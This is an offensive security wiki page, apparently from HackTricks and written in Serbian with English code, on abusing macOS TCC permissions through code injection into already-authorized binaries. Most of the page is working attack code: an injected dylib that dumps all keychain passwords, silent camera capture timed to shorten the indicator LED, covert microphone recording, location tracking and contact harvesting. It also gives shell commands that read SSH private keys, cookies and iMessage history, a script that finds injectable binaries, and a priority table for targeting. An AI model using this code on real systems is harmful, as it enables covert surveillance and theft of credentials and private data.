# macOS Krađa akreditiva i podataka putem TCC dozvola

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

macOS TCC (Transparency, Consent, and Control) štiti pristup osetljivim korisničkim podacima. Kada napadač kompromituje binarni fajl koji već ima TCC dodela, on nasleđuje te dozvole. Ova stranica dokumentuje mogućnosti eksploatacije svake TCC dozvole vezane za krađu podataka.

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **silently inherits all its TCC permissions**. There is no additional prompt or verification when the same process reads protected data.

---

## Grupe pristupa Keychain-u

### Nagrada

macOS Keychain čuva:
- **Wi‑Fi lozinke** — svi sačuvani kredencijali bežičnih mreža
- **Lozinke za sajtove** — Safari, Chrome (kada koristi Keychain), i lozinke drugih pregledača
- **Lozinke aplikacija** — nalozi e-pošte, VPN kredencijali, razvojni tokeni
- **Sertifikati i privatni ključevi** — code signing, client TLS, S/MIME encryption
- **Sigurne beleške** — tajne koje korisnik čuva

### Dozvola: `keychain-access-groups`

Keychain stavke su organizovane u **grupe pristupa**. `keychain-access-groups` entitlement aplikacije navodi koje grupe može da pristupi:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Eksploatacija
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Pristup kameri (kTCCServiceCamera)

### Eksploatacija

Binarni fajl sa dozvolom za kameru u TCC (putem `kTCCServiceCamera` ili `com.apple.security.device.camera` entitlement) može da snima fotografije i video:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Tiho snimanje
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Počevši od **macOS Sonoma**, indikator kamere u traci menija je stalan i ne može se programski sakriti. Na **starijim verzijama macOS-a**, kratko snimanje možda neće proizvesti primetan indikator.
>
---

## Pristup mikrofonu (kTCCServiceMicrophone)

### Iskorišćavanje

Pristup mikrofonu snima sav zvuk sa ugrađenog mikrofona, slušalica ili povezanih audio ulaznih uređaja:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Napad: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Praćenje lokacije (kTCCServiceLocation)

### Eksploatacija
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Kontinuirano praćenje
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakti / Kalendar / Fotografije

### Eksfiltracija ličnih podataka

| TCC servis | Framework | Podaci |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Imena, email adrese, telefoni, adrese |
| `kTCCServiceCalendar` | `EventKit` | Sastanci, učesnici, lokacije |
| `kTCCServicePhotos` | `Photos.framework` | Fotografije, snimci ekrana, metapodaci lokacije |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Prikupljanje kontakata
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud Account Access

### Entitlement: `com.apple.private.icloud-account-access`

Ovo ovlašćenje omogućava komunikaciju sa `com.apple.iCloudHelper` XPC servisom, pružajući pristup:
- **iCloud tokens** — autentifikacioni tokeni za korisnikov Apple ID
- **iCloud Drive** — sinhronizovani dokumenti sa svih uređaja
- **iCloud Keychain** — lozinke sinhronizovane na svim Apple uređajima
- **Find My** — lokacija svih korisnikovih Apple uređaja
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Kompromitovanjem iCloud-entitled binarnog fajla napad se širi sa **pojedinačnog uređaja na čitav Apple ekosistem**: druge Mac računare, iPhone, iPad, Apple Watch. Sinhronizacija iCloud Keychain znači da su lozinke sa svih uređaja dostupne.

---

## Puni pristup disku (kTCCServiceSystemPolicyAllFiles)

### Najmoćnija TCC dozvola

Puni pristup disku daje mogućnost čitanja **svake datoteke na sistemu**, uključujući:
- Podatke drugih aplikacija (Messages, Mail, istorija Safarija)
- TCC baze podataka (otkrivaju sve ostale dozvole)
- SSH ključeve i konfiguraciju
- Kolačiće pregledača i sesione tokene
- Baze podataka aplikacija i keševe
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matrica prioriteta eksploatacije

Prilikom procene injektabilnih binarnih fajlova kojima je TCC dodelio dozvole, prioritizirajte prema vrednosti podataka:

| Prioritet | TCC dozvole | Zašto |
|---|---|---|
| **Kritično** | Full Disk Access | Pristup svemu |
| **Kritično** | TCC Manager | Može dodeliti bilo koju dozvolu |
| **Visoko** | Keychain Access Groups | Sve sačuvane lozinke |
| **Visoko** | iCloud Account Access | Kompromitacija više uređaja |
| **Visoko** | Input Monitoring (ListenEvent) | Keylogging |
| **Visoko** | Accessibility | Kontrola GUI-a, samododeljivanje dozvola |
| **Srednje** | Screen Capture | Vizuelno snimanje podataka |
| **Srednje** | Camera + Microphone | Nadzor |
| **Srednje** | Contacts + Calendar | Podaci za social engineering |
| **Nisko** | Location | Fizičko praćenje |
| **Nisko** | Photos | Lični podaci |

## Skripta za enumeraciju
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Izvori

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
